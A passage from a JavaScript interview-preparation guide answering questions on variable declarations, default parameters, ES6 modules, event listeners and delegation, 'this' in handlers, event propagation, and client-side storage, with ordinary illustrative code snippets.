var x = 2;  // ✓ Allowed

// let/const don't allow redeclaration
let y = 1;
let y = 2;  // ✗ SyntaxError

const z = 1;
const z = 2;  // ✗ SyntaxError
```

### Global Object Properties

```javascript
// var creates properties on global object
var globalVar = 'global';
console.log(window.globalVar);  // 'global' (in browsers)

// let/const don't create global properties
let globalLet = 'global';
console.log(window.globalLet);  // undefined
```

<br>

## 34. What are default parameters in JavaScript functions?

**Default parameters** allow function parameters to have default values if no argument is passed or if `undefined` is passed.

### Basic Syntax

```javascript
function greet(name = 'Guest', greeting = 'Hello') {
    return `${greeting}, ${name}!`;
}

console.log(greet());                    // Hello, Guest!
console.log(greet('John'));              // Hello, John!
console.log(greet('John', 'Hi'));        // Hi, John!
console.log(greet(undefined, 'Hey'));    // Hey, Guest!
```

### Pre-ES6 Approach

Before ES6, default values were handled manually:

```javascript
function greet(name, greeting) {
    name = name || 'Guest';  // Problem: falsy values treated as missing
    greeting = greeting !== undefined ? greeting : 'Hello';
    return greeting + ', ' + name + '!';
}
```

### Default Parameters with Expressions

Default values can be any expression, evaluated at call time:

```javascript
function getDefault() {
    console.log('Getting default');
    return 'Default Value';
}

function test(value = getDefault()) {
    console.log(value);
}

test('Provided');  // Logs: Provided (getDefault not called)
test();            // Logs: Getting default, Default Value
```

### Using Previous Parameters

Later parameters can reference earlier ones:

```javascript
function createUser(name, role = 'User', greeting = `Welcome, ${name}`) {
    return {name, role, greeting};
}

console.log(createUser('John'));
// {name: 'John', role: 'User', greeting: 'Welcome, John'}

function calculatePrice(price, tax = price * 0.1) {
    return price + tax;
}

console.log(calculatePrice(100));  // 110
```

### With Destructuring

```javascript
function createUser({name = 'Guest', age = 18, role = 'User'} = {}) {
    return {name, age, role};
}

console.log(createUser());                           // {name: 'Guest', age: 18, role: 'User'}
console.log(createUser({name: 'John'}));            // {name: 'John', age: 18, role: 'User'}
console.log(createUser({name: 'Jane', age: 25}));   // {name: 'Jane', age: 25, role: 'User'}
```

### Handling null vs undefined

```javascript
function test(value = 'default') {
    console.log(value);
}

test();          // default
test(undefined); // default
test(null);      // null (null is a value, not absence of value)
test(0);         // 0
test('');        // '' (empty string)
test(false);     // false
```

### Array Default Parameters

```javascript
function sum([a = 0, b = 0] = []) {
    return a + b;
}

console.log(sum());           // 0
console.log(sum([5]));        // 5
console.log(sum([5, 10]));    // 15
```

### With Rest Parameters

```javascript
function logItems(first = 'No items', ...rest) {
    console.log('First:', first);
    console.log('Rest:', rest);
}

logItems();                    // First: No items, Rest: []
logItems('Item1', 'Item2');    // First: Item1, Rest: ['Item2']
```

### Complex Default Values

```javascript
function fetchData(url, options = {
    method: 'GET',
    headers: {'Content-Type': 'application/json'},
    timeout: 5000
}) {
    console.log('Fetching:', url, options);
}

fetchData('/api/users');
// Fetching: /api/users {method: 'GET', headers: {...}, timeout: 5000}
```

### Practical Examples

```javascript
// Pagination
function getPaginatedData(page = 1, limit = 10) {
    let offset = (page - 1) * limit;
    return {offset, limit};
}

// Date formatting
function formatDate(date = new Date(), format = 'YYYY-MM-DD') {
    // formatting logic
    return formattedDate;
}

// API requests
async function apiRequest(endpoint, method = 'GET', body = null) {
    let options = {method};
    if (body) options.body = JSON.stringify(body);
    return await fetch(endpoint, options);
}

// Configuration
function initializeApp(config = {
    debug: false,
    apiUrl: 'https://api.example.com',
    timeout: 3000
}) {
    console.log('App initialized with:', config);
}
```

### Benefits

- Cleaner, more readable code
- Self-documenting function signatures
- Reduces need for parameter validation
- Evaluated lazily (only when needed)
- Works naturally with destructuring

<br>

## 35. Explain the concept of modules in ES6.

**ES6 modules** provide a standardized way to organize and share JavaScript code across files, enabling better code organization, encapsulation, and reusability.

### Module Basics

Each file is a module with its own scope. Variables, functions, and classes are private unless explicitly exported.

### Exporting

**Named Exports**: Export multiple values from a module.

```javascript
// math.js
export const PI = 3.14159;

export function add(a, b) {
    return a + b;
}

export class Calculator {
    multiply(a, b) {
        return a * b;
    }
}

// Alternative: Export at once
const E = 2.71828;
function subtract(a, b) {
    return a - b;
}
export {E, subtract};
```

**Default Export**: Export a single main value from a module.

```javascript
// user.js
export default class User {
    constructor(name) {
        this.name = name;
    }
}

// Or with function
export default function greet(name) {
    return `Hello, ${name}`;
}

// Or with value
export default {
    name: 'Config',
    version: '1.0'
};
```

**Mixing Named and Default Exports**:

```javascript
// utils.js
export default function mainFunction() {}
export const helper1 = () => {};
export const helper2 = () => {};
```

### Importing

**Named Imports**:

```javascript
// Import specific exports
import {PI, add, Calculator} from './math.js';

console.log(PI);  // 3.14159
console.log(add(2, 3));  // 5

// Import with aliases
import {add as sum, subtract as minus} from './math.js';
console.log(sum(5, 3));  // 8

// Import all named exports
import * as MathUtils from './math.js';
console.log(MathUtils.PI);
console.log(MathUtils.add(2, 3));
```

**Default Imports**:

```javascript
// Import default export (can use any name)
import User from './user.js';
import MyUser from './user.js';  // Same import, different name

let user = new User('John');
```

**Mixed Imports**:

```javascript
import mainFunction, {helper1, helper2} from './utils.js';
```

### Module Patterns

**Barrel Exports** (index.js pattern):

```javascript
// components/index.js
export {Button} from


'./Button.js';
export {Input} from './Input.js';
export {Modal} from './Modal.js';

// Now import all from one place
import {Button, Input, Modal} from './components';
```

**Re-exporting**:

```javascript
// api/index.js
export {fetchUsers, fetchPosts} from './endpoints.js';
export {default as apiClient} from './client.js';
export * from './auth.js';  // Re-export all named exports
```

### Dynamic Imports

Load modules conditionally or on-demand:

```javascript
// Static import (loaded at parse time)
import {heavy} from './heavy-module.js';

// Dynamic import (loaded at runtime, returns a Promise)
button.addEventListener('click', async () => {
    const module = await import('./heavy-module.js');
    module.heavy();
});

// Conditional loading
if (condition) {
    import('./module-a.js').then(module => {
        module.doSomething();
    });
} else {
    import('./module-b.js').then(module => {
        module.doSomething();
    });
}

// With error handling
async function loadModule() {
    try {
        const {feature} = await import('./feature.js');
        feature();
    } catch (error) {
        console.error('Failed to load module:', error);
    }
}
```

### Module Characteristics

1. **Strict Mode**: Modules automatically run in strict mode.
    ```javascript
    // No need for 'use strict'
    // This is automatically strict mode
    ```

2. **Singleton**: Modules are evaluated once and cached.
    ```javascript
    // counter.js
    export let count = 0;
    export function increment() {
        count++;
    }
    
    // main.js
    import {count, increment} from './counter.js';
    import {count as count2} from './counter.js';
    
    increment();
    console.log(count);   // 1
    console.log(count2);  // 1 (same instance)
    ```

3. **Top-Level `this` is undefined**:
    ```javascript
    console.log(this);  // undefined in module, window in script
    ```

4. **Deferred Execution**: Module scripts are deferred by default.
    ```html
    <script type="module" src="app.js"></script>
    <!-- Automatically has defer behavior -->
    ```

### HTML Integration

```html
<!-- Module script -->
<script type="module">
    import {greet} from './utils.js';
    greet('World');
</script>

<!-- External module -->
<script type="module" src="main.js"></script>

<!-- Fallback for older browsers -->
<script nomodule src="bundle.js"></script>
```

### CommonJS vs ES6 Modules

| Feature | CommonJS (Node.js) | ES6 Modules |
|---------|-------------------|-------------|
| Syntax | `require()` / `module.exports` | `import` / `export` |
| Loading | Synchronous | Asynchronous |
| When evaluated | Runtime | Parse time (static) |
| Dynamic imports | Built-in | `import()` |
| Tree shaking | No | Yes |
| Browser support | No (needs bundler) | Yes (modern) |

```javascript
// CommonJS
const express = require('express');
module.exports = router;

// ES6 Modules
import express from 'express';
export default router;
```

### Benefits of ES6 Modules

- **Static Analysis**: Tools can analyze imports/exports at build time
- **Tree Shaking**: Remove unused code during bundling
- **Better Performance**: Async loading, parallel parsing
- **Standardized**: Works across environments (browsers, Node.js)
- **Encapsulation**: Private by default, explicit exports
- **Namespace Management**: Avoid global scope pollution

### Practical Example: Application Structure

```javascript
// config.js
export const API_URL = 'https://api.example.com';
export const TIMEOUT = 5000;

// api/client.js
import {API_URL, TIMEOUT} from '../config.js';

export async function fetchData(endpoint) {
    const response = await fetch(`${API_URL}${endpoint}`, {
        timeout: TIMEOUT
    });
    return response.json();
}

// api/users.js
import {fetchData} from './client.js';

export async function getUsers() {
    return fetchData('/users');
}

export async function getUser(id) {
    return fetchData(`/users/${id}`);
}

// api/index.js
export * from './users.js';
export * from './posts.js';

// main.js
import {getUsers, getUser} from './api/index.js';

async function init() {
    const users = await getUsers();
    console.log(users);
}

init();
```

<br>

# Event Handling (36-40)

## 36. How do you handle events in JavaScript?

**Event handling** allows JavaScript to respond to user interactions and browser events. JavaScript provides multiple ways to attach event handlers to DOM elements.

### Event Handler Methods

1. **Inline HTML Event Handlers** (Not recommended):
    ```html
    <button onclick="alert('Clicked!')">Click Me</button>
    <button onclick="handleClick()">Click Me</button>
    
    <script>
    function handleClick() {
        console.log('Button clicked');
    }
    </script>
    ```

2. **DOM Property Event Handlers**:
    ```javascript
    let button = document.getElementById('myButton');
    
    button.onclick = function() {
        console.log('Button clicked');
    };
    
    // Arrow function
    button.onclick = () => {
        console.log('Button clicked');
    };
    
    // Limitation: Only one handler per event type
    button.onclick = handler1;  // This will be overwritten
    button.onclick = handler2;  // Only this runs
    ```

3. **addEventListener()** (Recommended):
    ```javascript
    let button = document.getElementById('myButton');
    
    button.addEventListener('click', function(event) {
        console.log('Button clicked');
        console.log('Event:', event);
    });
    
    // Multiple handlers allowed
    button.addEventListener('click', handler1);
    button.addEventListener('click', handler2);
    // Both handlers will execute
    ```

### Common Events

```javascript
// Mouse events
element.addEventListener('click', handler);
element.addEventListener('dblclick', handler);
element.addEventListener('mousedown', handler);
element.addEventListener('mouseup', handler);
element.addEventListener('mousemove', handler);
element.addEventListener('mouseenter', handler);
element.addEventListener('mouseleave', handler);
element.addEventListener('mouseover', handler);
element.addEventListener('mouseout', handler);

// Keyboard events
element.addEventListener('keydown', handler);
element.addEventListener('keyup', handler);
element.addEventListener('keypress', handler);  // Deprecated

// Form events
element.addEventListener('submit', handler);
element.addEventListener('change', handler);
element.addEventListener('input', handler);
element.addEventListener('focus', handler);
element.addEventListener('blur', handler);

// Window events
window.addEventListener('load', handler);
window.addEventListener('resize', handler);
window.addEventListener('scroll', handler);
window.addEventListener('beforeunload', handler);

// Document events
document.addEventListener('DOMContentLoaded', handler);
```

### Event Object

The event handler receives an event object with useful properties:

```javascript
element.addEventListener('click', function(event) {
    console.log('Type:', event.type);              // 'click'
    console.log('Target:', event.target);          // Element that triggered event
    console.log('CurrentTarget:', event.currentTarget);  // Element with listener
    console.log('ClientX:', event.clientX);        // Mouse X coordinate
    console.log('ClientY:', event.clientY);        // Mouse Y coordinate
    console.log('Key:', event.key);                // Keyboard key (keyboard events)
    console.log('TimeStamp:', event.timeStamp);    // When event occurred
    
    // Prevent default behavior
    event.preventDefault();
    
    // Stop propagation
    event.stopPropagation();
});
```

### Event Handler Options

```javascript
// Capture phase
element.addEventListener('click', handler, true);

// Options object
element.addEventListener('click', handler, {
    capture: false,     // Use capture phase
    once: true,         // Remove after first invocation
    passive: true       // Never calls preventDefault()
});

// Passive for better scroll performance
window.addEventListener('scroll', handler, {passive: true});
```

### Removing Event Listeners

```javascript
function handleClick(event) {
    console.log('Clicked');
}

// Add listener
element.addEventListener('click', handleClick);

// Remove listener (must be same function reference)
element.removeEventListener('click', handleClick);

// Anonymous functions can't be removed
element.addEventListener('click', function() {
    console.log('Cannot remove this');
});
```

### Practical Examples

```javascript
// Button click with data
document.getElementById('submitBtn').addEventListener('click', function(event) {
    let formData = new FormData(document.getElementById('myForm'));
    console.log('Submitting:', formData);
});

// Input validation
document.getElementById('email').addEventListener('input', function(event) {
    let email = event.target.value;
    let isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    event.target.style.borderColor = isValid ? 'green' : 'red';
});

// Keyboard shortcuts
document.addEventListener('keydown', function(event) {
    if (event.ctrlKey && event.key === 's') {
        event.preventDefault();
        console.log('Save shortcut pressed');
    }
});

// Debounced scroll
let scrollTimeout;
window.addEventListener('scroll', function() {
    clearTimeout(scrollTimeout);
    scrollTimeout = setTimeout(() => {
        console.log('Scrolling stopped');
    }, 150);
});

// One-time event
button.addEventListener('click', function(event) {
    console.log('This only runs once');
}, {once: true});
```

<br>

## 37. What is event delegation and why is it useful?

**Event delegation** is a technique where you attach a single event listener to a parent element to handle events for multiple child elements, leveraging event bubbling.

### How It Works

Instead of attaching listeners to each child element, attach one listener to the parent and use the event's `target` property to determine which child triggered the event.

### Basic Example

```javascript
// Without delegation (inefficient)
document.querySelectorAll('li').forEach(item => {
    item.addEventListener('click', function() {
        console.log('Item clicked:', this.textContent);
    });
});

// With delegation (efficient)
document.getElementById('list').addEventListener('click', function(event) {
    if (event.target.tagName === 'LI') {
        console.log('Item clicked:', event.target.textContent);
    }
});
```

### Practical Example

```html
<ul id="todoList">
    <li>Task 1 <button class="delete">Delete</button></li>
    <li>Task 2 <button class="delete">Delete</button></li>
    <li>Task 3 <button class="delete">Delete</button></li>
</ul>

<script>
document.getElementById('todoList').addEventListener('click', function(event) {
    // Handle delete button clicks
    if (event.target.classList.contains('delete')) {
        let listItem = event.target.parentElement;
        listItem.remove();
    }
    
    // Handle list item clicks
    if (event.target.tagName === 'LI') {
        event.target.classList.toggle('completed');
    }
});

// Add new items dynamically - event handler still works!
function addTask(text) {
    let li = document.createElement('li');
    li.innerHTML = `${text} <button class="delete">Delete</button>`;
    document.getElementById('todoList').appendChild(li);
}
</script>
```

### Benefits

1. **Performance**: Single event listener instead of many.
    ```javascript
    // Bad: 1000 event listeners
    for (let i = 0; i < 1000; i++) {
        items[i].addEventListener('click', handler);
    }
    
    // Good: 1 event listener
    container.addEventListener('click', delegatedHandler);
    ```

2. **Memory Efficiency**: Fewer listeners means less memory usage.

3. **Dynamic Content**: Works for elements added after page load.
    ```javascript
    // Event delegation automatically works for new elements
    document.getElementById('container').addEventListener('click', function(event) {
        if (event.target.classList.contains('dynamic-item')) {
            console.log('Clicked dynamic item');
        }
    });
    
    // Add new element later - handler still works
    let newItem = document.createElement('div');
    newItem.className = 'dynamic-item';
    document.getElementById('container').appendChild(newItem);
    ```

4. **Simpler Code**: One handler instead of managing many.

### Advanced Pattern with Matching

```javascript
function delegate(parent, selector, eventType, handler) {
    parent.addEventListener(eventType, function(event) {
        let target = event.target;
        
        // Traverse up to find matching element
        while (target && target !== parent) {
            if (target.matches(selector)) {
                handler.call(target, event);
                return;
            }
            target = target.parentElement;
        }
    });
}

// Usage
delegate(document.body, '.delete-btn', 'click', function(event) {
    this.parentElement.remove();
});

delegate(document, '[data-action="save"]', 'click', function(event) {
    console.log('Save clicked');
});
```

### Handling Multiple Element Types

```javascript
document.getElementById('app').addEventListener('click', function(event) {
    let target = event.target;
    
    // Handle different elements
    if (target.matches('.edit-btn')) {
        handleEdit(target);
    } else if (target.matches('.delete-btn')) {
        handleDelete(target);
    } else if (target.matches('.card')) {
        handleCardClick(target);
    }
});
```

### Event Delegation with Data Attributes

```html
<div id="actions">
    <button data-action="save">Save</button>
    <button data-action="delete">Delete</button>
    <button data-action="cancel">Cancel</button>
</div>

<script>
document.getElementById('actions').addEventListener('click', function(event) {
    let action = event.target.dataset.action;
    
    switch(action) {
        case 'save':
            console.log('Saving...');
            break;
        case 'delete':
            console.log('Deleting...');
            break;
        case 'cancel':
            console.log('Canceling...');
            break;
    }
});
</script>
```

### When NOT to Use Event Delegation

- Events that don't bubble (`focus`, `blur`, `load`)
- When you need very specific control over individual elements
- Performance-critical handlers that run very frequently (mousemove)

### Comparison

```javascript
// Direct binding (1000 listeners)
let items = document.querySelectorAll('.item');
items.forEach(item => {
    item.addEventListener('click', function() {
        console.log(this.id);
    });
});

// Event delegation (1 listener)
document.getElementById('container').addEventListener('click', function(event) {
    if (event.target.classList.contains('item')) {
        console.log(event.target.id);
    }
});
```

<br>

## 38. How do you add and remove an event listener from an element?

JavaScript provides `addEventListener()` and `removeEventListener()` methods for managing event listeners dynamically.

### Adding Event Listeners

```javascript
let button = document.getElementById('myButton');

// Basic syntax
button.addEventListener('click', handleClick);

// With anonymous function
button.addEventListener('click', function(event) {
    console.log('Button clicked');
});

// With arrow function
button.addEventListener('click', (event) => {
    console.log('Button clicked');
});

// With options
button.addEventListener('click', handleClick, {
    capture: false,
    once: true,
    passive: false
});
```

### Removing Event Listeners

**Critical Rule**: You must pass the **exact same function reference** to remove a listener.

```javascript
// Define named function
function handleClick(event) {
    console.log('Clicked');
}

// Add listener
button.addEventListener('click', handleClick);

// Remove listener (works - same function reference)
button.removeEventListener('click', handleClick);

// This WON'T work - different function instances
button.addEventListener('click', function() {
    console.log('Clicked');
});
button.removeEventListener('click', function() {
    console.log('Clicked');
});
```

### Storing Function References

```javascript
// Store reference for later removal
let clickHandler = function(event) {
    console.log('Clicked');
};

button.addEventListener('click', clickHandler);

// Remove when needed
button.removeEventListener('click', clickHandler);
```

### Options Object for Removal

When using options, the `capture` value must match:

```javascript
// Add with capture: true
button.addEventListener('click', handler, true);

// Must remove with capture: true
button.removeEventListener('click', handler, true);

// This won't work (capture values don't match)
button.removeEventListener('click', handler, false);
```

### Practical Patterns

**Self-Removing Event Listener**:

```javascript
function handleOnce(event) {
    console.log('This runs once');
    event.target.removeEventListener('click', handleOnce);
}

button.addEventListener('click', handleOnce);

// Or use the 'once' option (simpler)
button.addEventListener('click', function(event) {
    console.log('This runs once');
}, {once: true});
```

**Conditional Event Listener**:

```javascript
let isEnabled = true;

function toggleListener() {
    if (isEnabled) {
        button.addEventListener('click', handleClick);
    } else {
        button.removeEventListener('click', handleClick);
    }
    isEnabled = !isEnabled;
}
```

**Multiple Event Types**:

```javascript
function handleEvent(event) {
    console.log('Event:', event.type);
}

// Add to multiple events
['click', 'mouseover', 'mouseout'].forEach(eventType => {
    button.addEventListener(eventType, handleEvent);
});

// Remove from multiple events
['click', 'mouseover', 'mouseout'].forEach(eventType => {
    button.removeEventListener(eventType, handleEvent);
});
```

**Event Listener Manager**:

```javascript
class EventManager {
    constructor(element) {
        this.element = element;
        this.listeners = new Map();
    }
    
    add(eventType, handler, options) {
        this.element.addEventListener(eventType, handler, options);
        
        if (!this.listeners.has(eventType)) {
            this.listeners.set(eventType, []);
        }
        this.listeners.get(eventType).push({handler, options});
    }
    
    remove(eventType, handler) {
        this.element.removeEventListener(eventType, handler);
        
        if (this.listeners.has(eventType)) {
            let handlers = this.listeners.get(eventType);
            this.listeners.set(eventType, 
                handlers.filter(h => h.handler !== handler)
            );
        }
    }
    
    removeAll(eventType) {
        if (this.listeners.has(eventType)) {
            this.listeners.get(eventType).forEach(({handler, options}) => {
                this.element.removeEventListener(eventType, handler, options);
            });
            this.listeners.delete(eventType);
        }
    }
    
    clear() {
        this.listeners.forEach((handlers, eventType) => {
            handlers.forEach(({handler, options}) => {
                this.element.removeEventListener(eventType, handler, options);
            });
        });
        this.listeners.clear();
    }
}

// Usage
let manager = new EventManager(button);
manager.add('click', handleClick);
manager.add('mouseover', handleHover);
manager.remove('click', handleClick);
manager.clear();  // Remove all listeners
```

**Cleanup on Component Removal**:

```javascript
class Component {
    constructor(element) {
        this.element = element;
        this.boundHandlers = [];
    }
    
    addListener(eventType, handler) {
        let boundHandler = handler.bind(this);
        this.element.addEventListener(eventType, boundHandler);
        this.boundHandlers.push({eventType, handler: boundHandler});
    }
    
    destroy() {
        // Remove all event listeners
        this.boundHandlers.forEach(({eventType, handler}) => {
            this.element.removeEventListener(eventType, handler);
        });
        this.boundHandlers = [];
    }
}
```

### Common Pitfalls

```javascript
// Pitfall 1: Anonymous functions can't be removed
button.addEventListener('click', () => console.log('Can\'t remove this'));

// Pitfall 2: Bind creates new function
let obj = {
    handleClick: function() {
        console.log(this);
    }
};

button.addEventListener('click', obj.handleClick.bind(obj));
// Can't remove because bind() created a new function!

// Solution: Store bound reference
obj.boundHandler = obj.handleClick.bind(obj);
button.addEventListener('click', obj.boundHandler);
button.removeEventListener('click', obj.boundHandler);  // Works!
```

<br>

## 39. Can you explain how "this" works in event handlers?

The value of **`this`** in event handlers depends on how the handler is defined and attached.

### Regular Function Event Handlers

With regular functions, `this` refers to the element that the event listener is attached to:

```javascript
button.addEventListener('click', function(event) {
    console.log(this);  // The button element
    console.log(this === event.currentTarget);  // true
    this.style.backgroundColor = 'red';
});
```

### Arrow Function Event Handlers

Arrow functions don't have their own `this` - they inherit `this` from the enclosing scope:

```javascript
let obj = {
    name: 'My Object',
    init: function() {
        // Regular function - 'this' is the button
        button.addEventListener('click', function() {
            console.log(this);  // button element
        });
        
        // Arrow function - 'this' is 'obj'
        button.addEventListener('click', () => {
            console.log(this);  // obj
            console.log(this.name);  // 'My Object'
        });
    }
};
```

### Inline HTML Event Handlers

`this` refers to the element itself:

```html
<button onclick="console.log(this)">Click Me</button>
<!-- Logs: the button element -->

<button onclick="handleClick(this)">Click Me</button>
<script>
function handleClick(element) {
    console.log(element);  // The button
}
</script>
```

### DOM Property Event Handlers

`this` refers to the element:

```javascript
button.onclick = function() {
    console.log(this);  // button element
    this.disabled = true;
};
```

### Practical Examples

**Accessing Element Properties**:

```javascript
document.querySelectorAll('.toggle').forEach(toggle => {
    toggle.addEventListener('click', function() {
        this.classList.toggle('active');
        console.log('Button ID:', this.id);
        console.log('Button text:', this.textContent);
    });
});
```

**Using Arrow Functions for Class Methods**:

```javascript
class Counter {
    constructor() {
        this.count = 0;
        this.button = document.getElementById('incrementBtn');
        
        // Arrow function preserves 'this' as Counter instance
        this.button.addEventListener('click', () => {
            this.count++;
            this.button.textContent = `Count: ${this.count}`;
        });
    }
}

let counter = new Counter();
```

**Binding `this` Manually**:

```javascript
let obj = {
    message: 'Hello',
    handleClick: function() {
        console.log(this.message);
    }
};

// Without bind - 'this' is button
button.addEventListener('click', obj.handleClick);
// Logs: undefined (this is button, not obj)

// With bind - 'this' is obj
button.addEventListener('click', obj.handleClick.bind(obj));
// Logs: 'Hello'
```

**Multiple Elements with Class Context**:

```javascript
class TodoItem {
    constructor(text) {
        this.text = text;
        this.element = this.create();
    }
    
    create() {
        let div = document.createElement('div');
        div.textContent = this.text;
        
        let deleteBtn = document.createElement('button');
        deleteBtn.textContent = 'Delete';
        
        // Arrow function to preserve 'this' as TodoItem instance
        deleteBtn.addEventListener('click', () => {
            console.log('Deleting:', this.text);
            this.element.remove();
        });
        
        div.appendChild(deleteBtn);
        return div;
    }
}

let todo = new TodoItem('Buy milk');
document.body.appendChild(todo.element);
```

**event.currentTarget vs this**:

```javascript
button.addEventListener('click', function(event) {
    console.log(this === event.currentTarget);  // true
    console.log(this === event.target);         // true if clicked directly on button
});
```

### Comparison Table

| Handler Type | `this` Value |
|--------------|--------------|
| addEventListener (regular function) | Element with listener |
| addEventListener (arrow function) | Lexical scope `this` |
| DOM property (onclick) | Element |
| Inline HTML (onclick="...") | Element |
| Class method (not bound) | Depends on call context |
| Class method (bound/arrow) | Class instance |

### Best Practices

```javascript
// Use regular functions when you need element access
element.addEventListener('click', function() {
    this.classList.toggle('active');  // 'this' is element
});

// Use arrow functions when you need outer scope access
class Component {
    constructor() {
        this.data = 'Component data';
        
        button.addEventListener('click', () => {
            console.log(this.data);  // Access component's 'this'
        });
    }
}

// Store element reference if needed in arrow functions
button.addEventListener('click', (event) => {
    let element = event.currentTarget;
    element.classList.toggle('active');
});
```

<br>

## 40. What is the difference between event.preventDefault() and event.stopPropagation()?

Both methods control event behavior, but they serve different purposes in event handling.

### event.preventDefault()

**Prevents the default action** associated with the event from occurring.

```javascript
// Prevent form submission
form.addEventListener('submit', function(event) {
    event.preventDefault();
    console.log('Form not submitted');
    // Custom validation or AJAX submission
});

// Prevent link navigation
link.addEventListener('click', function(event) {
    event.preventDefault();
    console.log('Link click prevented');
    // Custom navigation logic
});

// Prevent checkbox toggle
checkbox.addEventListener('click', function(event) {
    event.preventDefault();
    console.log('Checkbox state unchanged');
});

// Prevent text selection
element.addEventListener('mousedown', function(event) {
    event.preventDefault();
    // Text won't be selected
});
```

### event.stopPropagation()

**Stops the event from bubbling up** the DOM tree, preventing parent handlers from being notified.

```javascript
<div id="outer">
    <div id="middle">
        <button id="inner">Click Me</button>
    </div>
</div>

<script>
document.getElementById('outer').addEventListener('click', () => {
    console.log('Outer clicked');
});

document.getElementById('middle').addEventListener('click', () => {
    console.log('Middle clicked');
});

document.getElementById('inner').addEventListener('click', (event) => {
    event.stopPropagation();  // Stops bubbling
    console.log('Inner clicked');
});

// Clicking button logs only: "Inner clicked"
// Without stopPropagation: "Inner clicked", "Middle clicked", "Outer clicked"
</script>
```

### Key Differences

| Feature | preventDefault() | stopPropagation() |
|---------|------------------|-------------------|
| Purpose | Prevents default browser action | Stops event bubbling |
| Affects | Browser behavior | Event propagation |
| Example use | Prevent form submit, link navigation | Prevent parent handlers from executing |
| Related method | None | stopImmediatePropagation() |

### Practical Examples

**Using preventDefault() Only**:

```javascript
// Custom form validation
form.addEventListener('submit', function(event) {
    event.preventDefault();  // Don't submit
    
    if (validateForm()) {
        // Submit via AJAX
        submitViaAjax(new FormData(this));
    }
});

// Custom context menu
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();  // Don't show browser menu
    showCustomMenu(event.clientX, event.clientY);
});
```

**Using stopPropagation() Only**:

```javascript
// Click on card opens it, click on button doesn't
document.querySelector('.card').addEventListener('click', function() {
    console.log('Card clicked - open details');
});

document.querySelector('.card button').addEventListener('click', function(event) {
    event.stopPropagation();  // Don't trigger card click
    console.log('Button clicked - perform action');
});
```

**Using Both Together**:

```javascript
// Modal close button
document.querySelector('.modal').addEventListener('click', function() {
    console.log('Clicked outside - close modal');
    this.style.display = 'none';
});

document.querySelector('.modal-content').addEventListener('click', function(event) {
    event.stopPropagation();  // Don't close modal
    console.log('Clicked inside modal');
});

document.querySelector('.close-btn').addEventListener('click', function(event) {
    event.preventDefault();  // If it's a link
    event.stopPropagation();  // Don't trigger modal content handler
    document.querySelector('.modal').style.display = 'none';
});
```

### event.stopImmediatePropagation()

Stops propagation AND prevents other handlers on the same element from executing:

```javascript
button.addEventListener('click', function(event) {
    event.stopImmediatePropagation();
    console.log('First handler');
});

button.addEventListener('click', function() {
    console.log('Second handler - never executes');
});

// Only logs: "First handler"
```

### Return False (in some contexts)

In jQuery and some inline handlers, `return false` does both preventDefault() and stopPropagation():

```javascript
// jQuery (not vanilla JS)
$('a').on('click', function() {
    return false;  // Prevents default AND stops propagation
});

// Inline handler
<a href="#" onclick="doSomething(); return false;">Link</a>
```

**In vanilla JavaScript event listeners, `return false` does nothing:**

```javascript
button.addEventListener('click', function() {
    return false;  // Has NO effect in addEventListener
});
```

### Checking if Methods Were Called

```javascript
element.addEventListener('click', function(event) {
    console.log(event.defaultPrevented);  // false initially
    
    event.preventDefault();
    console.log(event.defaultPrevented);  // true after calling preventDefault()
});
```

### Real-World Scenario

```javascript
// Dropdown menu
document.querySelector('.dropdown').addEventListener('click', function(event) {
    event.stopPropagation();  // Don't close when clicking inside
    this.classList.toggle('open');
});

// Close dropdown when clicking outside
document.addEventListener('click', function() {
    document.querySelector('.dropdown').classList.remove('open');
});

// Prevent link default but allow propagation for analytics
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', function(event) {
        event.preventDefault();  // Prevent navigation
        // Allow bubbling for analytics tracking
        
        let href = this.getAttribute('href');
        // Custom navigation
        setTimeout(()



=> {
            window.location = href;
        }, 100);
    });
});
```

### When to Use Each

**Use `preventDefault()` when you want to:**
- Stop form submission for validation
- Prevent link navigation for SPAs
- Disable default drag/drop behavior
- Prevent context menu from showing
- Stop checkbox/radio from toggling

**Use `stopPropagation()` when you want to:**
- Prevent parent click handlers from firing
- Stop event delegation from catching the event
- Isolate component interactions
- Prevent modal/dropdown from closing when clicking inside

**Use both when you need to:**
- Handle nested interactive elements
- Create complex UI components
- Prevent both default actions and bubbling

<br>

# Web Storage and Security (41-44)

## 41. What is the difference between localStorage, sessionStorage, and cookies?

All three are mechanisms for storing data on the client-side, but they differ in lifespan, capacity, and usage patterns.

### localStorage

Stores data with **no expiration time**. Data persists even after browser is closed.

```javascript
// Store data
localStorage.setItem('username', 'John');
localStorage.setItem('preferences', JSON.stringify({theme: 'dark'}));

// Retrieve data
let username = localStorage.getItem('username');
let preferences = JSON.parse(localStorage.getItem('preferences'));

// Remove item
localStorage.removeItem('username');

// Clear all
localStorage.clear();

// Get number of items
console.log(localStorage.length);

// Get key by index
let firstKey = localStorage.key(0);

// Check if key exists
if (localStorage.getItem('username') !== null) {
    console.log('Username exists');
}
```

### sessionStorage

Stores data for **one session**. Data is cleared when the page session ends (tab/window closes).

```javascript
// Same API as localStorage
sessionStorage.setItem('temporaryData', 'value');
let data = sessionStorage.getItem('temporaryData');
sessionStorage.removeItem('temporaryData');
sessionStorage.clear();

// Survives page refresh but not tab close
window.addEventListener('beforeunload', () => {
    sessionStorage.setItem('scrollPosition', window.scrollY);
});

window.addEventListener('load', () => {
    let scrollPos = sessionStorage.getItem('scrollPosition');
    if (scrollPos) window.scrollTo(0, scrollPos);
});
```

### Cookies

Small text files stored on the client, **sent with every HTTP request** to the server.

```javascript
// Set cookie
document.cookie = "username=John; expires=Fri, 31 Dec 2024 23:59:59 GMT; path=/";

// Set with options
document.cookie = "sessionId=abc123; max-age=3600; path=/; secure; samesite=strict";

// Read cookies (requires parsing)
function getCookie(name) {
    let matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

let username = getCookie('username');

// Delete cookie (set expiration to past date)
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";

// Helper function to set cookie
function setCookie(name, value, days) {
    let expires = "";
    if (days) {
        let date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Helper function to delete cookie
